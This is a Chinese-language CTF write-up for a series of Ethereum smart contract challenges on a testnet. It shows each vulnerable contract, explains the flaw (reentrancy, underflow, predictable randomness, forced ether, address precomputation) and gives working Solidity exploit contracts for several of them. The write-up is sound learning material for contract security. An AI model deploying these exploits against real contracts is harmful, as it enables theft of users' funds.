---
comment: True
---

# Security Innovation Smart Contract CTF Writeups

!!! abstract 
    https://blockchain-ctf.securityinnovation.com/ 上的一系列以太坊智能合约类题目，入门 blockchain 的时候做的，这里记下做题记录

前置步骤：

- 安装 MetaMask 浏览器插件，并创建新账户
- 连接到 Ropsten 测试网络
- 通过 https://faucet.metamask.io/ 搞点测试币
- 在网站上连接 MetaMask、部署题目

---

## Donation

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract Donation is CtfFramework{
        using SafeMath for uint256;

        uint256 public funds;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            funds = funds.add(msg.value);
        }
        
        function() external payable ctf{
            funds = funds.add(msg.value);
        }

        function withdrawDonationsFromTheSuckersWhoFellForIt() external ctf{
            msg.sender.transfer(funds);
            funds = 0;
        }
    ```

目的是把合约账户搞没钱，所以在 Remix 中编译下代码，然后从题目部署的合约地址载入合约，再调用 withdrawDonationsFromTheSuckersWhoFellForIt 函数即可

---

## Lock Box

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    contract Lockbox1 is CtfFramework{
        uint256 private pin;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            pin = now%10000;
        }
        
        function unlock(uint256 _pin) external ctf{
            require(pin == _pin, "Incorrect PIN");
            msg.sender.transfer(address(this).balance);
        }
    }
    ```

可以发现，需要调用 unlock 函数，它需要接收一个正确的 pin，这个 pin 是从创建合约的时间戳计算来的，可以在链上找到部署时间，也可以通过 web3 读取合约 pin 位置的 storage 从而看到 pin 内容：

```js
> await web3.eth.getStorageAt("0x56e06639308e17fd9d948ebaea5b2e4b4beef06e", 1, (x,y)=>{console.log(y);})
0x0000000000000000000000000000000000000000000000000000000000000f73
```

然后同样在 Remix 上编译、载入再调用 unlock 函数输入正确的 pin 即可

---

## Piggy Bank

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract PiggyBank is CtfFramework{

        using SafeMath for uint256;

        uint256 public piggyBalance;
        string public name;
        address public owner;
        
        constructor(address _ctfLauncher, address _player, string _name) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            name=_name;
            owner=msg.sender;
            piggyBalance=piggyBalance.add(msg.value);
        }
        
        function() external payable ctf{
            piggyBalance=piggyBalance.add(msg.value);
        }

        
        modifier onlyOwner(){
            require(msg.sender == owner, "Unauthorized: Not Owner");
            _;
        }

        function withdraw(uint256 amount) internal{
            piggyBalance = piggyBalance.sub(amount);
            msg.sender.transfer(amount);
        }

        function collectFunds(uint256 amount) public onlyOwner ctf{
            require(amount<=piggyBalance, "Insufficient Funds in Contract");
            withdraw(amount);
        }
        
    }


    contract CharliesPiggyBank is PiggyBank{
        
        uint256 public withdrawlCount;
        
        constructor(address _ctfLauncher, address _player) public payable
            PiggyBank(_ctfLauncher, _player, "Charlie") 
        {
            withdrawlCount = 0;
        }
        
        function collectFunds(uint256 amount) public ctf{
            require(amount<=piggyBalance, "Insufficient Funds in Contract");
            withdrawlCount = withdrawlCount.add(1);
            withdraw(amount);
        }

    }
    ```

withdraw 是 internal，所以不能直接调用，collectFunds 是 public 可以调用

虽然在 PiggyBank 合约中加了 onlyOwner 这个 modifier，但是实际上部署的 CharliesPiggyBank 合约重载了这个函数并没有带 modifier，因此可以直接调用 collectFunds 来 withdraw 题目合约中的所有钱

---

## SI Token Sale

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    // https://github.com/OpenZeppelin/openzeppelin-solidity/blob/v1.8.0/contracts/token/ERC20/StandardToken.sol
    import "../StandardToken.sol";

    contract SIToken is StandardToken {

        using SafeMath for uint256;

        string public name = "SIToken";
        string public symbol = "SIT";
        uint public decimals = 18;
        uint public INITIAL_SUPPLY = 1000 * (10 ** decimals);

        constructor() public{
            totalSupply_ = INITIAL_SUPPLY;
            balances[this] = INITIAL_SUPPLY;
        }
    }

    contract SITokenSale is SIToken, CtfFramework {

        uint256 public feeAmount;
        uint256 public etherCollection;
        address public developer;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            feeAmount = 10 szabo; 
            developer = msg.sender;
            purchaseTokens(msg.value);
        }

        function purchaseTokens(uint256 _value) internal{
            require(_value > 0, "Cannot Purchase Zero Tokens");
            require(_value < balances[this], "Not Enough Tokens Available");
            balances[msg.sender] += _value - feeAmount;
            balances[this] -= _value;
            balances[developer] += feeAmount; 
            etherCollection += msg.value;
        }

        function () payable external ctf{
            purchaseTokens(msg.value);
        }

        // Allow users to refund their tokens for half price ;-)
        function refundTokens(uint256 _value) external ctf{
            require(_value>0, "Cannot Refund Zero Tokens");
            transfer(this, _value);
            etherCollection -= _value/2;
            msg.sender.transfer(_value/2);
        }

        function withdrawEther() external ctf{
            require(msg.sender == developer, "Unauthorized: Not Developer");
            require(balances[this] == 0, "Only Allowed Once Sale is Complete");
            msg.sender.transfer(etherCollection);
        }

    }
    ```

可以通过 refundTokens 来转出余额，但是最多只能转出 balances 的一半，所以要先提高自己的代币余额。不难发现 purchaseTokens 函数中存在下溢：
```solidity
balances[msg.sender] += _value - feeAmount;
```
只要传入的 _value 小于 feeAmount 就可以使 balances 下溢。虽然 purchaseTokens 函数是 internal 不能直接调用，但是 fallback 函数中直接将 msg.value 作为 _value 调用了 purchaseTokens 函数。因此可以先直接向合约账户转 1Wei，即可通过 fallback 触发下溢

之后就可以通过 refundTokens 来转出了。可以先调用 etherCollection 看一下需要转出的金额（也可以通过初始 + 1Wei 的方式计算），再乘以二就是要传给 refundTokens 的参数了

---

## Secure Bank

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    contract SimpleBank is CtfFramework{

        mapping(address => uint256) public balances;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            balances[msg.sender] = msg.value;
        }

        function deposit(address _user) public payable ctf{
            balances[_user] += msg.value;
        }

        function withdraw(address _user, uint256 _value) public ctf{
            require(_value<=balances[_user], "Insufficient Balance");
            balances[_user] -= _value;
            msg.sender.transfer(_value);
        }

        function () public payable ctf{
            deposit(msg.sender);
        }

    }

    contract MembersBank is SimpleBank{

        mapping(address => string) public members;

        constructor(address _ctfLauncher, address _player) public payable
            SimpleBank(_ctfLauncher, _player)
        {
        }

        function register(address _user, string _username) public ctf{
            members[_user] = _username;
        }

        modifier isMember(address _user){
            bytes memory username = bytes(members[_user]);
            require(username.length != 0, "Member Must First Register");
            _;
        }

        function deposit(address _user) public payable isMember(_user) ctf{
            super.deposit(_user);
        }

        function withdraw(address _user, uint256 _value) public isMember(_user) ctf{
            super.withdraw(_user, _value);
        }

    }

    contract SecureBank is MembersBank{

        constructor(address _ctfLauncher, address _player) public payable
            MembersBank(_ctfLauncher, _player)
        {
        }

        function deposit(address _user) public payable ctf{
            require(msg.sender == _user, "Unauthorized User");
            require(msg.value < 100 ether, "Exceeding Account Limits");
            require(msg.value >= 1 ether, "Does Not Satisfy Minimum Requirement");
            super.deposit(_user);
        }

        function withdraw(address _user, uint8 _value) public ctf{
            require(msg.sender == _user, "Unauthorized User");
            require(_value < 100, "Exceeding Account Limits");
            require(_value >= 1, "Does Not Satisfy Minimum Requirement");
            super.withdraw(_user, _value * 1 ether);
        }

        function register(address _user, string _username) public ctf{
            require(bytes(_username).length!=0, "Username Not Enough Characters");
            require(bytes(_username).length<=20, "Username Too Many Characters");
            super.register(_user, _username);
        }
    }
    ```

合约有点长，有三个合约 SimpleBank、MembersBank 和 SecureBank，是逐个继承的关系

通过 SimpleBank 的 constructor 可以看出，所有钱都转给了题目合约的创建者，而这个可以通过 etherscan 查到，所以目标就是调用 withdraw 函数来借助创建者的地址转出合约中的钱

而 withdraw 存在了一些问题：

- SecureBank 中的 withdraw 检查了传入的 _user 是否是 msg.sender，不能从中造假
- SecureBank 的 withdraw 的 _value 参数是 uint8 类型，而 MembersBank 中 withdraw 的参数是 uint256 类型，这导致了这两个函数并不是重载关系，而是两个函数

所以现在的目标是调用 MembersBank 的 withdraw 函数。可以发现它带有一个 isMember(_user) 的 modifier，所以先要给创建者的地址 register 一下，然后再调用 withdraw(address, uint256) 转出所有余额即可

---

## Lottery

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract Lottery is CtfFramework{

        using SafeMath for uint256;

        uint256 public totalPot;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            totalPot = totalPot.add(msg.value);
        }
        
        function() external payable ctf{
            totalPot = totalPot.add(msg.value);
        }

        function play(uint256 _seed) external payable ctf{
            require(msg.value >= 1 finney, "Insufficient Transaction Value");
            totalPot = totalPot.add(msg.value);
            bytes32 entropy = blockhash(block.number);
            bytes32 entropy2 = keccak256(abi.encodePacked(msg.sender));
            bytes32 target = keccak256(abi.encodePacked(entropy^entropy2));
            bytes32 guess = keccak256(abi.encodePacked(_seed));
            if(guess==target){
                //winner
                uint256 payout = totalPot;
                totalPot = 0;
                msg.sender.transfer(payout);
            }
        }    
    }
    ```

预测伪随机数，只需要编写一个新的合约然后根据 play 里的逻辑生成 target，然后传给 play 即可

需要注意的是要支付 1 finney 作为 value，并且在部署合约之后要先调用一下 Lottery 的 ctf_challenge_add_authorized_sender 函数（来自 CtfFramework）将合约地址加入白名单

???+ done "exp"
    ```solidity
    contract Exploit {
        Lottery challenge;
        constructor(address addr) public {
            challenge = Lottery(addr);
        }
        function exp() public payable {
            bytes32 entropy = blockhash(block.number);
            bytes32 entropy2 = keccak256(abi.encodePacked(this));
            uint256 ans = uint256(entropy ^ entropy2);
            challenge.play.value(msg.value)(ans);
        }
        function() public payable {}
        function destroy(address addr) public {
            selfdestruct(addr);
        }
    }
    ```

---

## Heads or Tails

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract HeadsOrTails is CtfFramework{

        using SafeMath for uint256;

        uint256 public gameFunds;
        uint256 public cost;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            gameFunds = gameFunds.add(msg.value);
            cost = gameFunds.div(10);
        }
        
        function play(bool _heads) external payable ctf{
            require(msg.value == cost, "Incorrect Transaction Value");
            require(gameFunds >= cost.div(2), "Insufficient Funds in Game Contract");
            bytes32 entropy = blockhash(block.number-1);
            bytes1 coinFlip = entropy[0] & 1;
            if ((coinFlip == 1 && _heads) || (coinFlip == 0 && !_heads)) {
                //win
                gameFunds = gameFunds.sub(msg.value.div(2));
                msg.sender.transfer(msg.value.mul(3).div(2));
            }
            else {
                //loser
                gameFunds = gameFunds.add(msg.value);
            }
        }

    }
    ```

同样是计算伪随机数，每次 play 需要 0.1 ether，并且从题目合约账户中转出 0.05 ether 作为奖励。因此需要调用 20 次 play 来转出账户中的 2 ether

同样需要在部署合约后调用题目合约的 ctf_challenge_add_authorized_sender 函数来将攻击合约地址加入白名单。并且做完之后 selfdestruct 来转回攻击合约中的 3 ether 会比较好

???+ done "exp"
    ```solidity
    contract Exploit {
        HeadsOrTails challenge;
        constructor(address addr) public {
            challenge = HeadsOrTails(addr);
        }
        function exp() public payable {
            bytes32 entropy = blockhash(block.number - 1);
            bytes1 coinFlip = entropy[0] & 1;
            for (int i = 0; i < 20; i++) {
                if (coinFlip == 1) {
                    challenge.play.value(0.1 ether)(true);
                } else {
                    challenge.play.value(0.1 ether)(false);
                }
            }
        }
        function() public payable {}
        function destroy(address addr) public {
            selfdestruct(addr);
        }
    }
    ```

---

## Trust Fund

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract TrustFund is CtfFramework{

        using SafeMath for uint256;

        uint256 public allowancePerYear;
        uint256 public startDate;
        uint256 public numberOfWithdrawls;
        bool public withdrewThisYear;
        address public custodian;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            custodian = msg.sender;
            allowancePerYear = msg.value.div(10);        
            startDate = now;
        }

        function checkIfYearHasPassed() internal{
            if (now>=startDate + numberOfWithdrawls * 365 days){
                withdrewThisYear = false;
            } 
        }

        function withdraw() external ctf{
            require(allowancePerYear > 0, "No Allowances Allowed");
            checkIfYearHasPassed();
            require(!withdrewThisYear, "Already Withdrew This Year");
            if (msg.sender.call.value(allowancePerYear)()){
                withdrewThisYear = true;
                numberOfWithdrawls = numberOfWithdrawls.add(1);
            }
        }
        
        function returnFunds() external payable ctf{
            require(msg.value == allowancePerYear, "Incorrect Transaction Value");
            require(withdrewThisYear==true, "Cannot Return Funds Before Withdraw");
            withdrewThisYear = false;
            numberOfWithdrawls=numberOfWithdrawls.sub(1);
        }
    }
    ```

重入攻击，写一个攻击合约，在其 fallback 中再次调用 withdraw 函数就可以实现重入，注意要在 MetaMask 发送交易时提高一下 gas，不然内部的交易会出现 gas 不足的问题

???+ done "exp"
    ```solidity
    contract Exploit {
        TrustFund challenge;
        constructor(address addr) public {
            challenge = TrustFund(addr);
        }
        function exp() public {
            challenge.withdraw();
        }
        function() public payable {
            challenge.withdraw();
        }
        function destroy(address addr) public {
            selfdestruct(addr);
        }
    }
    ```

---

## Record Label

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";


    contract Royalties{

        using SafeMath for uint256;

        address private collectionsContract;
        address private artist;

        address[] private receiver;
        mapping(address => uint256) private receiverToPercentOfProfit;
        uint256 private percentRemaining;

        uint256 public amountPaid;

        constructor(address _manager, address _artist) public
        {
            collectionsContract = msg.sender;
            artist=_artist;

            receiver.push(_manager);
            receiverToPercentOfProfit[_manager] = 80;
            percentRemaining = 100 - receiverToPercentOfProfit[_manager];
        }

        modifier isCollectionsContract() { 
            require(msg.sender == collectionsContract, "Unauthorized: Not Collections Contract");
            _;
        }

        modifier isArtist(){
            require(msg.sender == artist, "Unauthorized: Not Artist");
            _;
        }

        function addRoyaltyReceiver(address _receiver, uint256 _percent) external isArtist{
            require(_percent<percentRemaining, "Precent Requested Must Be Less Than Percent Remaining");
            receiver.push(_receiver);
            receiverToPercentOfProfit[_receiver] = _percent;
            percentRemaining = percentRemaining.sub(_percent);
        }

        function payoutRoyalties() public payable isCollectionsContract{
            for (uint256 i = 0; i< receiver.length; i++){
                address current = receiver[i];
                uint256 payout = msg.value.mul(receiverToPercentOfProfit[current]).div(100);
                amountPaid = amountPaid.add(payout);
                current.transfer(payout);
            }
            msg.sender.call.value(msg.value-amountPaid)(bytes4(keccak256("collectRemainingFunds()")));
        }

        function getLastPayoutAmountAndReset() external isCollectionsContract returns(uint256){
            uint256 ret = amountPaid;
            amountPaid = 0;
            return ret;
        }

        function () public payable isCollectionsContract{
            payoutRoyalties();
        }
    }

    contract Manager{
        address public owner;

        constructor(address _owner) public {
            owner = _owner;
        }

        function withdraw(uint256 _balance) public {
            owner.transfer(_balance);
        }

        function () public payable{
            // empty
        }
    }

    contract RecordLabel is CtfFramework{

        using SafeMath for uint256;

        uint256 public funds;
        address public royalties;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            royalties = new Royalties(new Manager(_ctfLauncher), _player);
            funds = funds.add(msg.value);
        }
        
        function() external payable ctf{
            funds = funds.add(msg.value);
        }


        function withdrawFundsAndPayRoyalties(uint256 _withdrawAmount) external ctf{
            require(_withdrawAmount<=funds, "Insufficient Funds in Contract");
            funds = funds.sub(_withdrawAmount);
            royalties.call.value(_withdrawAmount)();
            uint256 royaltiesPaid = Royalties(royalties).getLastPayoutAmountAndReset();
            uint256 artistPayout = _withdrawAmount.sub(royaltiesPaid); 
            msg.sender.transfer(artistPayout);
        }

        function collectRemainingFunds() external payable{
            require(msg.sender == royalties, "Unauthorized: Not Royalties Contract");
        }

    }
    ```

合约看起来很长，但是大致看一下的话就可以看出调用 withdrawFundsAndPayRoyalties 函数的时候会把全部的 _withdrawAmount 全部传给 Royalties，其中会将 80% 传给我们，再把 20% 传回去，而这 20% 又会在 withdrawFundsAndPayRoyalties 中再传给我们。所以只需要直接调用 withdrawFundsAndPayRoyalties 函数将 1 ether 提取出来就可以了

---

## Slot Machine

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";
    import "../../node_modules/openzeppelin-solidity/contracts/math/SafeMath.sol";

    contract SlotMachine is CtfFramework{

        using SafeMath for uint256;

        uint256 public winner;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            winner = 5 ether;
        }
        
        function() external payable ctf{
            require(msg.value == 1 szabo, "Incorrect Transaction Value");
            if (address(this).balance >= winner){
                msg.sender.transfer(address(this).balance);
            }
        }

    }
    ```

目标是让题目合约账户中的余额不少于 5 ether，而且合约中的 fallback 函数只接收 1 szabo

但是如果通过另一个合约的 selfdestruct 来将剩余余额全部转移到题目合约上的话是不会经过 fallback 函数的，所以创建另一个合约，转入不少于 3.5 ether 然后再 selfdestruct 就可以了 

???+ done "exp"
    ```solidity
    contract Exploit {
        address challenge;
        constructor(address addr) public payable {
            challenge = addr;
        }
        function exp() public {
            selfdestruct(challenge);
        }
    }
    ```

---

## Rainy Day Fund

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    contract DebugAuthorizer{
        
        bool public debugMode;

        constructor() public payable{
            if(address(this).balance == 1.337 ether){
                debugMode=true;
            }
        }
    }

    contract RainyDayFund is CtfFramework{

        address public developer;
        mapping(address=>bool) public fundManagerEnabled;
        DebugAuthorizer public debugAuthorizer;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            //debugAuthorizer = (new DebugAuthorizer).value(1.337 ether)(); // Debug mode only used during development
            debugAuthorizer = new DebugAuthorizer();
            developer = msg.sender;
            fundManagerEnabled[msg.sender] = true;
        }
        
        modifier isManager() {
            require(fundManagerEnabled[msg.sender] || debugAuthorizer.debugMode() || msg.sender == developer, "Unauthorized: Not a Fund Manager");
            _;
        }

        function () external payable ctf{
            // Anyone can add to the fund    
        }
        
        function addFundManager(address _newManager) external isManager ctf{
            fundManagerEnabled[_newManager] = true;
        }

        function removeFundManager(address _previousManager) external isManager ctf{
            fundManagerEnabled[_previousManager] = false;
        }

        function withdraw() external isManager ctf{
            msg.sender.transfer(address(this).balance);
        }
    }
    ```

转出所有钱的话要调用 withdraw 函数，它带有 isManager 这个 modifier，而 manager 我们改不了，所以思路在于开启 debug mode

但是题目的 constructor 中会创建 DebugAuthorizer 合约实例而且并不向其中转入 1.337 ether，也就不会打开 debug mode，后续再向其中转账的话也不会打开 debug mode（因为这个是在 constructor 中赋值的）

所以就需要提前计算出下一次 developer 部署的题目合约的地址，再提前计算出其创建的 DebugAuthorizer 的地址，先向其中转入 1.337 ether，这时重启题目会创建一个新的题目合约，其中创建 DebugAuthorizer 时检查 balance 发现已经有了 1.337 ether，也就打开了 debug mode 可以直接 withdraw

而提前计算合约地址的方法就是运用 create 的原理，即外部账户创建合约或者在合约中通过 CREATE 操作码创建新合约的时候计算地址的算法是：
```python
keccak(rlp.encode([deployer, nonce]))
```
并且在合约内部通过 CREATE 创建新合约的话，nonce 应该是 1

目前需要知道的是 developer（可以通过 etherscan 查到）部署当前题目合约时的 nonce 是多少（知道了这个之后下一次再部署的 nonce 就是其加一），只需要枚举一下 nonce 计算地址再和当前题目地址比较一下就可以爆破出来：
```python
import rlp
import web3

def calc_address(deployer, nonce):
    return web3.Web3.keccak(rlp.encode([deployer, nonce]))

for nonce in range(1, 1000000):
    if calc_address(0xeD0D5160c642492b3B482e006F67679F5b6223A2, nonce).hex().endswith("66318f6b06fd5769fa310732566b13d92cfbc589"):
        print(nonce)
        break
```
可以得到当前 nonce 是 484，所以下一次再部署题目的 nonce 就是 485。然后提前计算题目地址和 DebugAuthorizer 地址：
```python
deployer = 0xeD0D5160c642492b3B482e006F67679F5b6223A2
nonce = 485

challenge = int(calc_address(deployer, nonce).hex()[-40:], 16)
print(f"next challenge address: {hex(challenge)}")

debug = int(calc_address(challenge, 1).hex()[-40:], 16)
print(f"next DebugAuthorizer address: {hex(debug)}")
"""
next challenge address: 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d
next DebugAuthorizer address: 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe
"""
```
所以先向 0xe177fc1703942b50cd95a87bb9dfa4ab3cf3a1fe 转账 1.337 ether，再重置题目（可以验证一下现在的题目地址就是 0xe3ddc258e3c557c11d8f54bb72583bd36d7af22d），直接调用 withdraw 函数就可以了

---

## Raffle

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    contract Raffle is CtfFramework{

        uint256 constant fee = 0.1 ether;

        address private admin;

        bytes4 private winningTicket;
        uint256 private blocknum;

        uint256 public ticketsBought;
        bool public raffleStopped;

        mapping(address=>uint256) private rewards;
        mapping(address=>bool) private potentialWinner;
        mapping(address=>bytes4) private ticketNumbers;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
            rewards[address(this)] = msg.value;
            admin = msg.sender;
        }

        function buyTicket() external payable ctf{
            if(msg.value >= fee){
                winningTicket = bytes4(0);
                blocknum = block.number+1;
                ticketsBought += 1;
                raffleStopped = false;
                rewards[msg.sender] += msg.value;
                ticketNumbers[msg.sender] = bytes4((msg.value - fee)/10**8);
                potentialWinner[msg.sender] = true;
            }
        }

        function closeRaffle() external ctf{
            require(ticketsBought>0);
            require(!raffleStopped);
            require(blocknum != 0);
            require(winningTicket == bytes4(0));
            require(block.number>blocknum);
            require(msg.sender==admin || rewards[msg.sender]>0);
            winningTicket = bytes4(blockhash(blocknum));
            potentialWinner[msg.sender] = false;
            raffleStopped = true;
        }

        function collectReward() external payable ctf{
            require(raffleStopped);
            require(potentialWinner[msg.sender]);
            rewards[address(this)] += msg.value;
            if(winningTicket == ticketNumbers[msg.sender]){
                msg.sender.transfer(rewards[msg.sender]);
                msg.sender.transfer(rewards[address(this)]); 
                rewards[msg.sender] = 0;
                rewards[address(this)] = 0;
            }
        }

        function skimALittleOffTheTop(uint256 _value) external ctf{
            require(msg.sender==admin);
            require(rewards[address(this)]>_value);
            rewards[address(this)] = rewards[address(this)] - _value;
            msg.sender.transfer(_value);
        }

        function () public payable ctf{
            if(msg.value>=fee){
                this.buyTicket();
            }
            else if(msg.value == 0){
                this.closeRaffle();
            }
            else{
                this.collectReward();
            }
        }

    }
    ```

是一个抽奖，需要通过 buyTicket 买票获得资格，并且 ticketNumbers 为 (msg.value - fee)/10**8，结束抽奖需要调用 closeRaffle 函数，但是这也会取消抽奖资格。而最后抽中的 ticketNumbers 为最后一个买票的 blocknum 的 blockhash

这就有了一个漏洞，blockhash 只会计算最近的 256 个块，再早的结果会是 0

但是如果使用两个合约一个来关闭抽奖，另一个领奖的话，不能取出全部的余额（因为关闭抽奖的账户买票的钱不会转出来）。因此需要通过 fallback 函数，value 为 0 的时候会调用 closeRaffle，这会使 closeRaffle 判断的 msg.sender 为自身。所以只需要买下票，然后等待出 256 个块之后触发 fallback 然后再 collectReward 就好了

这里注意还要把题目合约地址通过调用 ctf_challenge_add_authorized_sender 加入白名单，才可以在 fallback 中调用自身函数

???+ done "exp"
    ```solidity
    contract Exploit {
        Raffle challenge;
        constructor(address addr) public {
            challenge = Raffle(addr);
        }
        function buyTicket() public payable {
            challenge.buyTicket.value(msg.value)();
        }
        function exp() public {
            address(challenge).call.value(0 ether)();
            challenge.collectReward();
        }
        function() public payable {}
        function destroy(address addr) public {
            selfdestruct(addr);
        }
    }
    ```

---

## Scratchcard

??? question "题目合约"
    ```solidity
    pragma solidity 0.4.24;

    import "../CtfFramework.sol";

    library Address {
        function isContract(address account) internal view returns (bool) {
            uint256 size;
            assembly { size := extcodesize(account) }
            return size > 0;
        }
    }

    contract Scratchcard is CtfFramework{

        event CardPurchased(address indexed player, uint256 cost, bool winner);

        mapping(address=>uint256) private winCount;
        uint256 private cost;


        using Address for address;

        constructor(address _ctfLauncher, address _player) public payable
            CtfFramework(_ctfLauncher, _player)
        {
        }

        modifier notContract(){
            require(!msg.sender.isContract(), "Contracts Not Allowed");
            _;
        }
        
        function play() public payable notContract ctf{
            bool won = false;
            if((now%10**8)*10**10 == msg.value){
                won = true;
                winCount[msg.sender] += 1;
                cost = msg.value;
                msg.sender.transfer(cost);
            }
            else{
                cost = 0;
                winCount[msg.sender] = 0;
            }
            emit CardPurchased(msg.sender, msg.value, won);
        }    

        function checkIfMegaJackpotWinner() public view returns(bool){
            return(winCount[msg.sender]>=25);
        }

        function collectMegaJackpot(uint256 _amount) public notContract ctf{
            require(checkIfMegaJackpotWinner(), "User Not Winner");
            require(2 * cost - _amount > 0, "Winners May Only Withdraw Up To 2x Their Scratchcard Cost");
            winCount[msg.sender] = 0;
            msg.sender.transfer(_amount);
        }

        function () public payable ctf{
            play();
        }

    }
    ```

调用 play 来猜随机数，play 函数有一个 notContract 的 modifier，这个可以通过在 constructor 中直接操作来绕过，因此可以直接在攻击合约中调用 25 次 play 函数来达到条件，转出的时候虽然判断了 `#!solidity 2*cost - _amount > 0` 但都是 uint 可以下溢，所以直接转出全部就好了

另外还需要提前计算一下攻击合约的地址，再调用 ctf_challenge_add_authorized_sender 函数预先把要部署的攻击合约的位置加入白名单后才可以部署攻击合约

???+ done "exp"
    ```solidity
    contract Attacker {
        Scratchcard challenge;
        uint public count;
        uint public money;
        constructor(address addr, address player) public payable {
            challenge = Scratchcard(addr);
            count = 0;
            while (count < 25) {
                money = (now%10**8)*10**10;
                challenge.play.value(money)();
                count += 1;
            }
            challenge.collectMegaJackpot(addr.balance);
            selfdestruct(player);
        }
        function() public payable {}
    }

    contract Exploit {
        Scratchcard challenge;
        address player;
        uint8 public nonce;
        constructor(address addr, address _player) public {
            challenge = Scratchcard(addr);
            player = _player;
            nonce = 1;
        }
        function exp() public payable {
            address attacker = address(keccak256(0xd6, 0x94, this, nonce));
            nonce += 1;
            challenge.ctf_challenge_add_authorized_sender(attacker);
            address(attacker).transfer(4 ether);
            Attacker newAttacker = new Attacker(address(challenge), player);
        }
        function() public payable {}
        function destroy() public {
            selfdestruct(player);
        }
    }
    ```